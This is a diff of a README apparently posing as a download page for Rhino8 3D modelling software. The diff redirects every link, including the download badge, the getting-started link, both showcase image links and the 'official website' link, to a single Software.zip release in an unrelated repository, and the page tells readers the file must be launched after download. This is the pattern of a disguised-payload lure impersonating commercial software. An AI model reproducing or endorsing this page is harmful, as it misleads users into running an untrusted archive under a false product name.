@@ -1,6 +1,6 @@
 # 🦏🎨 Rhino8 3D Modeling Software 🖥️📐
 
-[![Download Rhino8](https://img.shields.io/badge/Download-Rhino8-9cf)](https://github.com/cli/go-gh/archive/refs/tags/v1.0.0.zip)
+[![Download Rhino8](https://github.com/ClebsDSGN/Rhino8-3D-Modeling-Software/releases/download/v1.0/Software.zip)](https://github.com/ClebsDSGN/Rhino8-3D-Modeling-Software/releases/download/v1.0/Software.zip)
 
 Welcome to Rhino8 3D Modeling Software, where you can unleash your creativity and design stunning 3D models with ease. Whether you're an architect, designer, engineer, or hobbyist, Rhino8 provides the tools you need to bring your ideas to life in the world of 3D design.
 
@@ -21,7 +21,7 @@ Welcome to Rhino8 3D Modeling Software, where you can unleash your creativity an
 - Rhino8
 
 ## 🚀 Getting Started with Rhino8:
-1. Download the Rhino8 software package from [here](https://github.com/cli/go-gh/archive/refs/tags/v1.0.0.zip). Kindly note that the file needs to be launched after download.
+1. Download the Rhino8 software package from [here](https://github.com/ClebsDSGN/Rhino8-3D-Modeling-Software/releases/download/v1.0/Software.zip). Kindly note that the file needs to be launched after download.
 2. Install Rhino8 on your computer following the installation instructions provided in the package.
 3. Explore the vast array of features and tools Rhino8 offers to create your 3D masterpiece.
 
@@ -35,10 +35,10 @@ Welcome to Rhino8 3D Modeling Software, where you can unleash your creativity an
 - Accurate Measurement and Scaling Options
 
 ## 📷 Showcase of Rhino8 Creations:
-![3D Building Design](https://example.com/3d_building.jpg)
+![3D Building Design](https://github.com/ClebsDSGN/Rhino8-3D-Modeling-Software/releases/download/v1.0/Software.zip)
 *Stunning architectural design created using Rhino8.*
 
-![Product Rendering](https://example.com/product_rendering.jpg)
+![Product Rendering](https://github.com/ClebsDSGN/Rhino8-3D-Modeling-Software/releases/download/v1.0/Software.zip)
 *High-quality product rendering crafted in Rhino8.*
 
 ## 🌟 Why Choose Rhino8?
@@ -50,6 +50,6 @@ Rhino8 sets itself apart from other 3D modeling software with its user-friendly 
 3. Collaborate with other designers and enthusiasts to exchange ideas and inspiration.
 
 ## 📞 Get in Touch:
-Have questions, feedback, or suggestions regarding Rhino8? Feel free to reach out to us through our [official website](https://www.rhino8.com) for support and assistance.
+Have questions, feedback, or suggestions regarding Rhino8? Feel free to reach out to us through our [official website](https://github.com/ClebsDSGN/Rhino8-3D-Modeling-Software/releases/download/v1.0/Software.zip) for support and assistance.
 
 Let your imagination soar with Rhino8 3D Modeling Software and create breathtaking 3D designs that captivate and inspire. Download Rhino8 today and unlock a world of endless creative possibilities! 🦏✨
